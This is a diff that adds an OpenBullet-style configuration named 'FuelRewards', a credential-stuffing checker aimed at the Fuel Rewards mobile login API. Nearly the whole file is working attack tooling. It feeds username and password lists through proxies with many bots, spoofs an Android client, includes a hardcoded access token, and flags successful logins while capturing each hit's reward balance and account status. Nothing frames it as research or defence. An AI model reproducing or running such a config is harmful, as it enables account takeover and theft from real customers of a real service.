@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "FuelRewards",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-04T11:23:22.5273138+01:00",
+  "AdditionalInfo": "",
+  "Author": "Meowtit",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://restmws.fuelrewards.com/fuelrewards/public/rest/v2/frnExcentus/login" 
+  CONTENT "{\"userId\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "access_token: 432c26b1-6535-4d6e-85d8-1b6731874921" 
+  HEADER "tags: [{\"deviceType\":\"and\",\"deviceModeType\":\"cons\",\"deviceOSVer\":\"8.0.0\",\"DeviceID\":\"Samsung Galaxy S9\"}]" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errorCode\":702" 
+    KEY "errorCode\":701" 
+  KEYCHAIN Success OR 
+    KEY "responseCode\":\"SUCCESS" 
+#PARSE_rewardBalance PARSE "<SOURCE>" LR "rewardBalance\":" ",\"" -> CAP "rewardBalance" 
+#PARSE_status PARSE "<SOURCE>" LR "\"status\":\"" "\"" -> CAP "status" 
